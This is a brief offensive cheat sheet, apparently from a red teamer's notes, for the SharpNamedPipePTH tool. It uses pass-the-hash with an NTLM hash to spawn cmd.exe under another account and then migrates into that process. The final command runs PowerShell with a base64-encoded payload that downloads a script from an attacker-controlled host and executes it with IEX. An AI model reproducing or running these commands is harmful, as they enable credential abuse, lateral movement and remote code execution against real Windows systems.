# SharpNamedPipePTH

### 1) Runs the cmd.exe

    execute-assembly /home/kali/tools/bins/csharp-files/SharpNamedPipePTH.exe username:domain\\user hash:ffffffffffffffffffffffffffffffff binary:C:\\windows\\system32\\cmd.exe

### 2) Find out process launched

    ps -e cmd.exe

### 3) Migrate into the process

    migrate -p 1234

OR Directly get shell

    execute-assembly /home/kali/tools/bins/csharp-files/SharpNamedPipePTH.exe 'username:domain\\user hash:ffffffffffffffffffffffffffffffff binary:"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" arguments:"-nop -w 1 -sta -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOQAwAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="'
